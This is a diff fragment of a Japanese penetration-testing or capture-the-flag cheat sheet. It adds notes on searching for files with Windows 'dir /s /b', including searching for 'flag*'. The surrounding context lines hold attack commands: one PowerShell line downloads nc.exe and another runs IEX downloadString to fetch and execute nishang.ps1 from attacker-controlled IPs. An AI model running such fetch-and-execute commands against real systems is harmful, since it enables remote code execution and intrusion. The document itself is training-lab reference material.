@@ -1460,6 +1460,15 @@ powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destinatio
 powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
 ```
 
+#### ファイルの検索
+```
+dir /s /b <ファイル名>
+dir /s /b flag*
+```
+- /s...サブフォルダまで含めたファイルまで検索対象とする
+- /b...ファイル名だけ表示
+
+
 #### SMBを用いたファイル共有
 ```
 攻撃側(送信側):
